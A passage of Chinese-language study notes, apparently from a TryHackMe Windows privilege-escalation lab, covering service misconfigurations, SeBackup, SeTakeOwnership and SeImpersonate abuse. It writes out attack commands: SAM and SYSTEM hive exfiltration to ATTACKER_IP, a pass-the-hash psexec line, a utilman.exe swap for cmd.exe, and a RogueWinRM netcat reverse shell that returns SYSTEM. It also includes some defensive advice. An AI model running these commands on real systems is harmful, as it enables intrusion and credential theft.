Sorter.exe</p><p>虽然默认情况下，大多数服务可执行文件将安装在 <code>C：\Program Files</code> 或 <code>C：\Program Files （x86）</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改了已安装文件夹的权限，使服务容易受到攻击。- </p><p>管理员可能决定在非默认路径中安装服务二进制文件。如果这样的路径是全局可写的，则可以利用此漏洞。</p><p>icacls可用来检查权限</p><p>例:</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313212200593.png" alt="image-20250313212200593"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313212236780.png" alt="image-20250313212236780"></p><p>使用 msfvenom 创建 exe-service 负载并将其传输到目标主机的过程与以前相同，因此请随意创建以下负载并像以前一样将其上传到服务器。我们还将启动一个侦听器，以便在执行时接收反向 shell：</p><p>有效负载进入服务器后，将其移动到可能发生劫持的任何位置。在本例中，我们会将有效负载移动到 <code>C：\MyPrograms\Disk.exe</code>。我们还将授予 Everyone 对该文件的完全权限，以确保服务可以执行该文件：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313215705636.png" alt="image-20250313215705636"></p><h4 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h4><p>如果服务的可执行 DACL 配置正确，并且服务的二进制路径被正确引用，则您可能仍有很小的机会利用该服务。如果服务 DACL（而不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p><p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。为方便起见，C<code>：\\tools</code> 中提供了一份副本。检查 thmservice 服务 DACL 的命令为：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313220059481.png" alt="image-20250313220059481"></p><p>这里我们可以看到 <code>BUILTIN\\Users</code> 组具有 SERVICE_ALL_ACCESS 权限，这意味着任何用户都可以重新配置服务。</p><p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的机器上为它启动一个监听器：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250313220115972.png" alt="image-20250313220115972"></p><p>然后，我们会将反向 shell 可执行文件传输到目标计算机并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。随意使用 wget 传输可执行文件并将其移动到所需位置。请记住向 Everyone 授予执行有效负载的权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure><p>要更改服务的关联可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后的空格）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure><h3 id="Abusing-dangerous-privileges滥用危险权限"><a href="#Abusing-dangerous-privileges滥用危险权限" class="headerlink" title="Abusing dangerous privileges滥用危险权限"></a>Abusing dangerous privileges滥用危险权限</h3><p>权限是帐户执行特定系统相关任务时必须拥有的权限。这些任务可以像关闭计算机的权限一样简单，也可以绕过某些基于 DACL 的访问控制的权限。</p><p>每个用户都有一组分配的权限，可以使用以下命令检查这些权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p><p>展示如何滥用您能找到的一些最常见的特权。</p><h4 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h4><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p><p>拥有此权限，攻击者可以使用多种技术轻松提升系统的权限。我们将查看的配置包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p><p>此帐户是“Backup Operators”组的一部分，默认情况下，该组被授予 SeBackup 和 SeRestore 权限。我们需要使用 “Open as administrator（以管理员身份打开）”选项打开命令提示符以使用这些权限。系统将要求我们再次输入密码以获取提升的控制台：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185406640.png" alt="image-20250317185406640"></p><p>shell弹出来后进行一个简单的提权</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185518767.png" alt="image-20250317185518767"></p><p>首先备份一个</p><p><strong><code>hklm\system</code></strong></p><ul><li>备份 <code>HKEY_LOCAL_MACHINE\SYSTEM</code>，其中包含系统配置、驱动程序信息等关键数据。</li><li>该 Hive 可用于提取 <strong>系统启动信息、LSA Secrets、SAM 账户解密密钥</strong> 等。</li></ul><p><strong><code>hklm\sam</code></strong></p><ul><li>备份 <code>HKEY_LOCAL_MACHINE\SAM</code>，它存储 Windows 本地账户信息。</li><li>该 Hive 可用于提取 <strong>用户哈希密码（NTLM Hash）</strong>。</li></ul><p><strong>获取 Windows 本地账户的 NTLM Hash</strong></p><ul><li><p><code>HKLM\SAM</code> 存储用户凭据，但它是加密的。</p></li><li><p><code>HKLM\SYSTEM</code> 里存有解密密钥，可用来解密 <code>SAM</code> 中的 NTLM Hash。</p><p>然后使用一些方法将其copy到你的攻击机上</p><p>下面我们演示用smb服务来将文件传到攻击机上</p><p>你的命令在攻击者机器  上使用 <strong>Impacket</strong> 提供了一个 SMB 共享服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure><p>这将创建一个名为 <code>public</code> 的共享，指向<code>共享</code>目录，这需要我们当前 Windows 会话的用户名和密码。在此之后，我们可以使用 Windows 机器中的 <code>copy</code> 命令将两个文件传输到我们的 攻击机</p></li></ul><p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185803701.png" alt="image-20250317185803701"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure><p>使用 impacket 检索用户的密码哈希值：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250317190128805.png" alt="image-20250317190128805"></p><p>然后就可以使用Administrator 的哈希来执行 Pass-the-Hash 攻击，并以 SYSTEM 权限访问目标计算机：</p><h5 id="补充Pass-the-Hash-Pass-The-Ticket"><a href="#补充Pass-the-Hash-Pass-The-Ticket" class="headerlink" title="补充Pass-the-Hash,Pass The Ticket"></a>补充Pass-the-Hash,Pass The Ticket</h5><p>这里对 Pass-the-Hash 进行一个扩展补充</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</span><br><span class="line"></span><br><span class="line">虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</span><br></pre></td></tr></table></figure><p>Pass The Ticket</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">票据传递攻击（Pass The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。</span><br><span class="line">常用的攻击方式：MS14-068、黄金票据、白银票据等。</span><br></pre></td></tr></table></figure><p>PAC<br>微软在Windows平台上对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书。</p><p>在一个域中，通过 User 的 SID 和所在组 Group 的 SID 来确定该用户所拥有的权限。所以 PAC 包含 Client 的 User 的 SID、Group 的 SID。PAC 为了保证自身的合法性，还包含 2 个签名。</p><p>（1）Client 向 AS 请求认证，验证完Client的身份后，AS 在返回 TGT 时，生成 PAC，以及用于确保 PAC 不被篡改的两个签名，一个签名的密钥为 KDC用户（krbtgt） 的 NTLM Hash，另一个签名的密钥为 Server 的 NTLM Hash，而签名的内容主要为 User SID、Group SID </p><p><img src="/../imgs/$%7Bfiilename%7D/56260b9c801216db85604fc05602c7b0.png" alt="img"></p><p>Client向 TGS 发送请求，来获取访问 Server的Ticket 。TGS 对TGS Request 中的 TGT 解密，并通过两个签名来验证 PAC 的合法性。若验证通过，TGS 会重新生成两个新的签名保证 PAC 不被篡改。第一个签名的密钥为 Server 的 NTLM Hash，第二个密钥为 Server 与 Client 的临时会话密钥 Session Key（Server-Client）。新的 PAC 会被放置在签发的访问票据 Ticket 中，使用 Server 的 NTLM Hash进行加密。<br><img src="/../imgs/$%7Bfiilename%7D/bbc787a1a68f2a6f15fdbd9e65eee5e1.png" alt="img"></p><p>Client 使用 Ticket 向 Server 请求相应的资源， Server收到请求，将 Ticket 解密并验证，校验 PAC 中的两个签名，验证 PAC 的合法性，之后根据 PAC 得知Client的权限，让其访问对应资源。</p><p>3、漏洞产生原理<br>Client 在向 AS 发送请求时，可以设置一个名为 include-pac 的字段为 False，而后 AS 生成的 TGT 并不会含有PAC，该字段默认为 True。在 Client 收到不含 PAC 的 TGT 后，可以添加一个 PAC 放于TGS Request 的数据包中，而 TGS 收到这个请求的数据包时，仍能正确解析出放在 TGS Request 中其他位置的 PAC 信息，因为 KDC 允许用户使用这样的构造。</p><p>在 KDC 对 PAC 进行验证时，对于PAC中的签名算法，虽然原则上规定使用密钥加密的签名算法，但微软在实际场景中却允许 Client 指定任意签名算法。所以Client 构造一个PAC，其中添加高权限的User SID 与 Group SID信息，并指定使用MD5进行签名，只要TGS Requset 数据不丢失，那么该伪造的 PAC 就能被验证通过。</p><p>PAC 验证通过后，KDC 会将 PAC 中的 User SID、Group SID 取出来，重新使用KDC用户（krbtgt） 的 NTLM Hash 和 Server 的 NTLM Hash 分别生成两个新的签名。之后生成一个新的 TGT ，并把 PAC放入其中，加密后发送给 Client，而不是发送 Ticket 给Client。</p><p><img src="/../imgs/$%7Bfiilename%7D/ebef05203431531694a4817c0574f91a.png" alt="img"></p><p>参考:[渗透测试中的域渗透之MS14-068域控提权+票据传递攻击PTT-CSDN博客](<a href="https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88Pass">https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=票据传递攻击（Pass</a> The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。,PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。 常用的攻击方式：MS14-068、黄金票据、白银票据等。)</p><p>[域渗透-哈希传递攻击(Pass The Hash&#x2F;Key) - 知乎](<a href="https://zhuanlan.zhihu.com/p/472019671#:~:text=%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92">https://zhuanlan.zhihu.com/p/472019671#:~:text=哈希传递</a> (pth)攻击是指攻击者可以通过捕获密码的hash值 (对应着密码的值)%2C然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。,因为对于每个Session hash值都是固定的，除非密码被修改了 (需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@目标ip</span><br></pre></td></tr></table></figure><h4 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h4><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 运行的服务并获取该服务的可执行文件的所有权。但是，对于这项任务，我们将采取不同的路线。</p><p>要获得 SeTakeOwnership 权限，我们需要使用 “Open as administrator” 选项打开命令提示符。系统将要求我们输入密码以获取提升的控制台：</p><p><img src="/../imgs/$%7Bfiilename%7D/33303d0cde736589d2838ee894379ff2.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;33303d0cde736589d2838ee894379ff2.png"></p><p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span><br></pre></td></tr></table></figure><p>由于 Utilman 是以 SYSTEM 权限运行的，如果我们将原始的二进制文件替换为我们构建的payload文件，我们将有效地获得目标机的 SYSTEM 权限。 由于我们可以拥有任何文件的所有权，因此替换原始二进制文件是微不足道的。 要替换 utilman，我们将首先在目标机上使用以下命令获取它的所有权，具体命令和执行结果如下：</p><p>这次我们将滥用 utilman.exe 来提升权限。 Utilman 是一个内置的 Windows 应用程序，用于在计算机锁定屏幕期间 提供“轻松访问”选项：</p><p><img src="/../imgs/$%7Bfiilename%7D/a5437a609e41d982b320967667e9b97a.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;a5437a609e41d982b320967667e9b97a.png"></p><p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们为任何我们喜欢的有效负载替换原始二进制文件，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p><p>要替换 utilman，我们首先使用以下命令获取它的所有权：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.</span><br></pre></td></tr></table></figure><p>请注意，成为文件的所有者并不一定意味着您对它拥有权限，但作为所有者，您可以为自己分配所需的任何权限。要授予用户对 utilman.exe 的完全权限，您可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line">processed file: Utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure><p>在此之后，我们将 utilman.exe 替换为 cmd.exe 的副本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\&gt; copy cmd.exe utilman.exe</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure><p>要触发 utilman，我们将从开始按钮锁定屏幕：</p><p><img src="/../imgs/$%7Bfiilename%7D/dd7290ca93369cee33182023cb9190ff.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;dd7290ca93369cee33182023cb9190ff.png"></p><p>最后，继续单击“Ease of Access”按钮，该按钮utilman.exe SYSTEM 权限运行。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p><p><img src="/../imgs/$%7Bfiilename%7D/1401bc3dcb1e4eb84f526b95567a5ef8.png" alt="utilman shell"></p><h4 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h4><p>这些权限允许进程模拟其他用户并代表他们执行(即一个进程可以假装成另一个用户，并以该用户的权限执行操作。)。模拟通常包括能够在其他用户的安全上下文下生成进程或线程。(意味着这个新进程&#x2F;线程将继承被模拟用户的权限，而不是原始进程的权限。)</p><p>当您考虑 FTP 服务器的工作原理时，很容易理解模拟。FTP 服务器必须限制用户仅访问应允许他们查看的文件。</p><p>(FTP是用来在两台计算机之间传输文件，是Internet中应用非常广泛的服务之一，它可根据实际需要设置各用户的使用权限，同时还具有跨平台的特性，即在UNIX、Linux和Windows等操作系统中都可实现FTP客户端和服务器，相互之间可跨平台进行文件的传输。)</p><p>假设我们有一个 FTP 服务正在运行，用户为 <code>ftp</code>。在没有模拟的情况下，如果用户 Ann 登录到 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问这些文件：</p><p><img src="/../imgs/$%7Bfiilename%7D/6e5768172fbb97d6777dde7e15a3fcfc.png" alt="img"></p><p>使用 ftp 的令牌不是最好的主意有几个原因：</p><ul><li><p>为了正确提供文件，<code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户使用 <code>ftp</code>。这增加了复杂性，因为我们必须为每个提供的文件&#x2F;目录手动配置特定权限。</p></li><li><p>对于作系统，所有文件都由用户 <code>ftp</code> 访问，而与当前登录到 FTP 服务的用户无关。这使得无法将授权委托给作系统;因此，FTP 服务必须实现它。</p></li><li><p>如果 FTP 服务在某个时候遭到入侵，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p></li></ul><p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它代表他们执行任何任务：</p><p><img src="/../imgs/$%7Bfiilename%7D/89e74e14454edc10fa2bd541ac359772.png" alt="img"></p><p>现在，如果用户 Ann 登录到 FTP 服务，并且 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件就不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且作系统会处理授权。由于 FTP 服务正在模拟 Ann，因此在该会话期间无法访问 Jude 或 Bill 的文件。</p><p>作为攻击者，如果我们设法使用 SeImpersonate 或 SeAssignPrimaryToken 权限控制进程，我们可以模拟连接到该进程并进行身份验证的任何用户。</p><p>(✅ <strong>攻击者需要利用 <code>SeImpersonatePrivilege</code> 或 <code>SeAssignPrimaryTokenPrivilege</code>，让进程可以模拟连接的用户。</strong><br> ✅ <strong>为了提权，攻击者必须找到方法让 SYSTEM 或管理员账户连接到该进程，并进行身份验证。</strong><br> ✅ <strong>常见方法包括创建恶意 Web 服务器、使用 COM 组件劫持（Juicy Potato）、利用命名管道劫持（PrintSpoofer）等。</strong></p><p>🚀 <strong>最终目标：攻击者通过 Token 窃取，把低权限账户提升为 SYSTEM，完全控制 Windows 机器！</strong>)</p><p>✅ <strong>Windows 系统中的 <code>LOCAL SERVICE</code> 和 <code>NETWORK SERVICE</code> 账户默认拥有 <code>SeImpersonatePrivilege</code>（模拟权限）。</strong><br> ✅ <strong>这些账户通常用于运行受限的系统服务，因此 Windows 允许它们在需要时模拟连接的用户，以便执行某些操作。</strong><br> ✅ <strong>IIS（Internet Information Services）会为 Web 应用创建默认账户 <code>IIS APPPOOL\DefaultAppPool</code>，它也具有类似的模拟权限。</strong></p><p>要使用此类帐户提升权限，攻击者需要满足以下条件：1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以便进行模拟。2. 找到一种方法来强制特权用户连接并验证生成的恶意进程。</p><p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p><p>首先，假设我们已经入侵了在 IIS 上运行的网站，并且我们已经在以下地址植入了一个 Web shell：</p><p>我们可以使用 Web Shell 来检查被盗用账户的分配权限，并确认我们拥有此任务所需的两种权限：</p><p><img src="/../imgs/$%7Bfiilename%7D/4603506a36f4bbda602dc67cdc845d9f.png" alt="Webshell impersonate privileges"></p><p>要使用 RogueWinRM，我们首先需要将漏洞利用程序上传到目标计算机。为方便起见，这已经完成，您可以在 <code>C：\tools\</code> 文件夹中找到该漏洞。</p><p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建与端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台的端口，以便通过网络远程使用。可以将其视为 SSH，但使用 Powershell。</p><p>这段话解释了<strong>RogueWinRM 漏洞的核心原理</strong>，主要利用了 <strong>Windows BITS（后台智能传输服务）</strong> 的特性来劫持 SYSTEM 权限的连接，从而在 WinRM（Windows 远程管理）服务上实现提权。</p><h5 id="🔹-RogueWinRM-为什么可行？"><a href="#🔹-RogueWinRM-为什么可行？" class="headerlink" title="🔹 RogueWinRM 为什么可行？"></a><strong>🔹 RogueWinRM 为什么可行？</strong></h5><p>💡 <strong>关键点：</strong><br> 1️⃣ <strong>BITS（后台智能传输服务）</strong> 允许<strong>任何用户（包括低权限用户）启动它</strong>。<br> 2️⃣ <strong>当 BITS 服务启动时，它会以 SYSTEM 权限自动连接 WinRM（端口 5985）</strong>。<br> 3️⃣ <strong>WinRM 端口 5985 本质上是 Windows 的 SSH</strong>，提供远程 PowerShell 访问功能。<br> 4️⃣ <strong>攻击者可以利用这个自动连接劫持 SYSTEM 令牌，实现提权！</strong></p><p><strong>📌 1. BITS（Background Intelligent Transfer Service）</strong></p><ul><li>Windows 的后台文件传输服务，常用于<strong>Windows 更新、OneDrive 同步等任务</strong>。</li><li><strong>任何用户</strong>（包括普通用户）都可以手动启动 BITS 服务！</li><li><strong>当 BITS 运行时，它会自动以 SYSTEM 权限访问 WinRM（5985 端口）。</strong></li></ul><p><strong>📌 2. WinRM（Windows 远程管理，端口 5985）</strong></p><ul><li>WinRM 允许远程管理 Windows 计算机，本质上<strong>就是 PowerShell 远程管理的底层服务</strong>。</li><li>默认监听 <strong>TCP 5985（HTTP）和 5986（HTTPS）端口</strong>。</li><li><strong>可以用来执行远程 PowerShell 命令，类似于 SSH。</strong></li></ul><p><strong>📌 3. RogueWinRM 攻击原理</strong><br> ✅ <strong>第一步：创建恶意 WinRM 服务器</strong></p><ul><li>攻击者运行 <code>RogueWinRM.exe</code>，创建一个<strong>假 WinRM 服务器</strong>，监听本地 5985 端口。</li><li>这样，当 SYSTEM 级别的进程（如 BITS）尝试连接时，会不小心连接到<strong>攻击者控制的 WinRM 服务器</strong>。</li></ul><p>✅ <strong>第二步：启动 BITS 触发 SYSTEM 连接</strong></p><ul><li>低权限用户可以<strong>手动启动 BITS</strong>（因为 Windows 允许所有用户操作 BITS 服务）。</li><li>由于 BITS 启动后会自动以 SYSTEM 权限连接 5985，攻击者可以拦截该请求！</li></ul><p>✅ <strong>第三步：劫持 SYSTEM 令牌并提权</strong></p><ul><li><strong>当 SYSTEM 进程连接时，攻击者可以劫持其访问令牌（Token）。</strong></li><li><strong>最终，攻击者可以模拟 SYSTEM 账户，获得完整的系统控制权限！</strong></li></ul><p>如果由于某种原因，WinRM 服务未在受害者服务器上运行，攻击者可以在端口 5985 上启动虚假的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有 SeImpersonate 权限，则他可以代表连接用户执行任何命令，即 SYSTEM。</p><p>在运行漏洞之前，我们将启动一个 netcat 侦听器，以便在攻击者的机器上接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞：</span><br><span class="line"></span><br><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/24545e313a2e5ddee2386a68b4c7adeb.png" alt="RogueWinRM exploit execution"></p><p>**注意：**该漏洞可能需要长达 2 分钟才能起作用，因此您的浏览器可能会在一段时间内显示为无响应。如果您多次运行漏洞利用，则会发生这种情况，因为它必须等待 BITS 服务停止后才能再次启动它。BITS 服务将在启动 2 分钟后自动停止。</p><p><code>-p</code> 参数指定漏洞利用程序要运行的可执行文件，在本例中<code>为 nc64.exe</code>。<code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 建立一个针对攻击者机器的反向 shell，因此传递给 netcat 的参数将是 <code>-e cmd.exe ATTACKER_IP 4442</code>。</p><p>如果所有设置都已正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br><span class="line">Listening on 0.0.0.0 4442</span><br><span class="line">Connection received on 10.10.175.90 49755</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><h5 id="🔹-如何防御-RogueWinRM？"><a href="#🔹-如何防御-RogueWinRM？" class="headerlink" title="🔹 如何防御 RogueWinRM？"></a><strong>🔹 如何防御 RogueWinRM？</strong></h5><p>🚨 <strong>1. 禁用 WinRM（如果不需要）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">Disable-PSRemoting -Force</span><br></pre></td></tr></table></figure><p>这样即使 BITS 以 SYSTEM 权限运行，它也不会连接到 5985 端口，攻击将失败。</p><p>🚨 <strong>2. 限制 BITS 服务的访问权限</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">sc sdset bits D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)</span><br></pre></td></tr></table></figure><p>这会限制只有 SYSTEM 账户能启动 BITS，防止低权限用户滥用。</p><p>🚨 <strong>3. 监控 BITS 启动日志</strong><br> BITS 运行时会在 Windows 事件日志中留下痕迹，可以监控并检测异常活动。</p><p>🚨 <strong>4. 关闭不必要的 IIS 站点或 Web 服务</strong><br> 因为很多 Web 服务器环境下 <code>SeImpersonatePrivilege</code> 默认可用，减少攻击面可降低风险。</p><h5 id="🔹-总结"><a href="#🔹-总结" class="headerlink" title="🔹 总结"></a><strong>🔹 总结</strong></h5><p>✅ <strong>RogueWinRM 通过 BITS 服务触发 SYSTEM 连接到 WinRM，进而劫持 SYSTEM 令牌，实现提权。</strong><br> ✅ <strong>利用 BITS 自动连接 5985（WinRM 端口）这一特性，让攻击者可以在低权限环境下轻松获取 SYSTEM 权限。</strong><br> ✅ <strong>防御措施包括禁用 WinRM、限制 BITS 权限、监控系统日志等，以降低攻击风险。</strong></p><p>💀 <strong>这个漏洞适用于 Windows 服务器环境，尤其是启用了 WinRM 和 BITS 的情况下，非常危险！</strong></p><h3 id="Abusing-vulnerable-software-滥用易受攻击的软件"><a href="#Abusing-vulnerable-software-滥用易受攻击的软件" class="headerlink" title="Abusing vulnerable software(滥用易受攻击的软件)"></a>Abusing vulnerable software(滥用易受攻击的软件)</h3><h4 id="Unpatched-Software-未修补的软件"><a href="#Unpatched-Software-未修补的软件" class="headerlink" title="Unpatched Software 未修补的软件"></a>Unpatched Software 未修补的软件</h4><p>在渗透测试或系统排查过程中，列出目标系统上已安装的软件及其版本信息，可能会发现<strong>存在已知漏洞的旧版本软件</strong>，从而提供**权限提升（Privilege Escalation）**的机会。例如：</p><ol><li><strong>未打补丁的软件</strong>：攻击者可以查找软件的 CVE（公共漏洞和暴露）记录，利用已知漏洞提升权限。</li><li><strong>过时的第三方驱动</strong>：某些软件会安装内核驱动，旧版驱动可能存在权限提升漏洞。</li><li><strong>错误的权限配置</strong>：某些软件目录或二进制文件的权限设置不当，可能被低权限用户修改或替换。</li></ol><p>相关命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get 